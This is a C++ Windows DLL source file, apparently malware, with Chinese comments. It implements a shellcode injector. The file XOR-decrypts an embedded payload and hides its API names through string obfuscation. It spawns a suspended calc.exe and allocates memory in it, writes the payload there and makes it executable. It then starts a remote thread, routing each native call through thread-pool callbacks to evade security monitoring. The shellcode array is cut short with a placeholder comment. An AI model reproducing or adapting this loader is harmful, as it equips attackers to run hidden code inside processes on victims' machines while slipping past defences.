#include "MaliciousCore.h"
#include "syscalls.h"
#include <winternl.h>

#pragma warning(disable: 4996)

// ---------- 全局变量定义 ----------
DWORD wNtWaitForSingleObject = 0;
UINT_PTR sysAddrNtWaitForSingleObject = 0;

// ---------- shellcode 与密钥 ----------
unsigned char key[] = "zishen";
unsigned char shellcode[] = {
    // ... 你的完整加密 shellcode ...
    0x86, 0x21, 0xf0, 0x8c, 0x95, 0x86, 0xb6, 0x69, 0x73, 0x68, 0x24, 0x3f, 0x3b, 0x39, 0x21, 0x20,
    0x54, 0xbc, 0x2b, 0x0c, 0x3b, 0xe3, 0x37, 0x0e, 0x32, 0xe2, 0x21, 0x70, 0x33, 0x26, 0xf1, 0x3b,
    // 注意：这里应保留你原数组的全部内容
};

// ---------- 工具函数 ----------
static void XORCrypt(unsigned char* data, int len, const unsigned char* key, int keyLen) {
    for (int i = 0; i < len; i++)
        data[i] ^= key[i % keyLen];
}

static void DecodeString(char* out, const unsigned char* enc, int len, unsigned char xorKey) {
    for (int i = 0; i < len; i++)
        out[i] = enc[i] ^ xorKey;
    out[len] = '\0';
}

static BOOL InitSyscallInfo() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    UINT_PTR pFunc = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");
    if (!pFunc) return FALSE;
    wNtWaitForSingleObject = *((unsigned char*)(pFunc + 4));
    for (int i = 0; i < 32; i++) {
        if (*(unsigned char*)(pFunc + i) == 0x0F && *(unsigned char*)(pFunc + i + 1) == 0x05) {
            sysAddrNtWaitForSingleObject = pFunc + i;
            return TRUE;
        }
    }
    return FALSE;
}

// ---------- 导出函数 ----------
BOOL ExecutePayload() {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);

    // 加密字符串（与之前一致）
    unsigned char enc_ntdll[] = { 68, 94, 78, 70, 70, 4, 78, 70, 70 }; // "ntdll.dll" ^ 0x2A
    unsigned char enc_NtAlloc[] = { 87,109,88,117,117,118,122,120,109,124,79,112,107,109,108,120,117,84,124,116,118,107,96 };
    unsigned char enc_NtWrite[] = { 93,103,68,97,122,103,118,69,122,97,103,102,114,127,94,118,126,124,97,106 };
    unsigned char enc_NtProtect[] = { 81,107,79,109,112,107,122,124,107,73,118,109,107,106,126,115,82,122,114,112,109,102 };
    unsigned char enc_NtCreate[] = { 108,86,97,80,71,67,86,71,118,74,80,71,67,70,103,90 };
    unsigned char enc_TpAllocWork[] = { 81,117,68,105,105,106,102,82,106,119,110 };
    unsigned char enc_TpPostWork[] = { 82,118,86,105,117,114,81,105,116,109 };
    unsigned char enc_TpReleaseWork[] = { 83,119,85,98,107,98,102,116,98,80,104,117,108 };
    unsigned char enc_calc[] = { 96,95,93,80,95,18,89,68,89 }; // "\\calc.exe" ^ 0x3C

    char str_ntdll[20], str_NtAlloc[30], str_NtWrite[30], str_NtProtect[30], str_NtCreate[30];
    char str_TpAlloc[20], str_TpPost[20], str_TpRelease[20], str_calc[20];
    DecodeString(str_ntdll, enc_ntdll, sizeof(enc_ntdll), 0x2A);
    DecodeString(str_NtAlloc, enc_NtAlloc, sizeof(enc_NtAlloc), 0x19);
    DecodeString(str_NtWrite, enc_NtWrite, sizeof(enc_NtWrite), 0x13);
    DecodeString(str_NtProtect, enc_NtProtect, sizeof(enc_NtProtect), 0x1F);
    DecodeString(str_NtCreate, enc_NtCreate, sizeof(enc_NtCreate), 0x22);
    DecodeString(str_TpAlloc, enc_TpAllocWork, sizeof(enc_TpAllocWork), 0x05);
    DecodeString(str_TpPost, enc_TpPostWork, sizeof(enc_TpPostWork), 0x06);
    DecodeString(str_TpRelease, enc_TpReleaseWork, sizeof(enc_TpReleaseWork), 0x07);
    DecodeString(str_calc, enc_calc, sizeof(enc_calc), 0x3C);

    HMODULE hNtdll = GetModuleHandleA(str_ntdll);
    if (!hNtdll) return FALSE;

    if (!InitSyscallInfo()) return FALSE;

    auto pTpAllocWork = (NTSTATUS(NTAPI*)(PTP_WORK*, PTP_WORK_CALLBACK, PVOID, PTP_CALLBACK_ENVIRON))
        GetProcAddress(hNtdll, str_TpAlloc);
    auto pTpPostWork = (VOID(NTAPI*)(PTP_WORK))GetProcAddress(hNtdll, str_TpPost);
    auto pTpReleaseWork = (VOID(NTAPI*)(PTP_WORK))GetProcAddress(hNtdll, str_TpRelease);
    if (!pTpAllocWork || !pTpPostWork || !pTpReleaseWork) return FALSE;

    // 创建挂起的 calc.exe
    wchar_t Cappname[MAX_PATH] = { 0 };
    GetSystemDirectoryW(Cappname, MAX_PATH);
    wchar_t wideStr[256];
    MultiByteToWideChar(CP_ACP, 0, str_calc, -1, wideStr, 256);
    wcscat_s(Cappname, 256, wideStr);
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessW(Cappname, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
        return FALSE;

    // 分配 RW 内存
    PVOID allocBuffer = NULL;
    SIZE_T buffSize = sizeof(shellcode);
    NTALLOCATEVIRTUALMEMORY_ARGS allocArgs = { 0 };
    allocArgs.pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, str_NtAlloc);
    allocArgs.hProcess = pi.hProcess;
    allocArgs.address = &allocBuffer;
    allocArgs.size = &buffSize;
    allocArgs.permissions = PAGE_READWRITE;

    PTP_WORK work = NULL;
    pTpAllocWork(&work, WorkCallback, &allocArgs, NULL);
    pTpPostWork(work);
    WaitForSingleObject(pi.hProcess, 2000);
    pTpReleaseWork(work);
    if (!allocBuffer) { TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return FALSE; }

    // 解密并写入 shellcode
    XORCrypt(shellcode, sizeof(shellcode), (unsigned char*)key, sizeof(key) - 1);
    SIZE_T bytesWritten = 0;
    NTWRITEVIRTUALMEMORY_ARGS writeArgs = { 0 };
    writeArgs.pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, str_NtWrite);
    writeArgs.hProcess = pi.hProcess;
    writeArgs.baseAddress = allocBuffer;
    writeArgs.buffer = shellcode;
    writeArgs.size = sizeof(shellcode);
    writeArgs.bytesWritten = &bytesWritten;

    PTP_WORK work2 = NULL;
    pTpAllocWork(&work2, Work2Callback, &writeArgs, NULL);
    pTpPostWork(work2);
    WaitForSingleObject(pi.hProcess, 2000);
    pTpReleaseWork(work2);

    // 修改权限为 RX
    ULONG oldProtect = 0;
    NTPROTECTVIRTUALMEMORY_ARGS protectArgs = { 0 };
    protectArgs.pNtProtectVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, str_NtProtect);
    protectArgs.hProcess = pi.hProcess;
    protectArgs.address = &allocBuffer;
    protectArgs.size = &buffSize;
    protectArgs.newProtection = PAGE_EXECUTE_READ;
    protectArgs.oldProtection = &oldProtect;

    PTP_WORK work4 = NULL;
    pTpAllocWork(&work4, Work4Callback, &protectArgs, NULL);
    pTpPostWork(work4);
    WaitForSingleObject(pi.hProcess, 2000);
    pTpReleaseWork(work4);

    // 创建远程线程
    NTCREATETHREADEX_ARGS threadArgs = { 0 };
    threadArgs.pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, str_NtCreate);
    threadArgs.hThread = &pi.hThread;
    threadArgs.access = GENERIC_EXECUTE;
    threadArgs.objectAttributes = NULL;
    threadArgs.hProcess = pi.hProcess;
    threadArgs.startRoutine = (PVOID)allocBuffer;
    threadArgs.argument = NULL;
    threadArgs.flags = FALSE;
    threadArgs.zeroBits = 0;
    threadArgs.stackSize = 0;
    threadArgs.maxStackSize = 0;
    threadArgs.attributeList = NULL;

    PTP_WORK work3 = NULL;
    pTpAllocWork(&work3, Work3Callback, &threadArgs, NULL);
    pTpPostWork(work3);
    WaitForSingleObject(pi.hProcess, 2000);
    pTpReleaseWork(work3);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
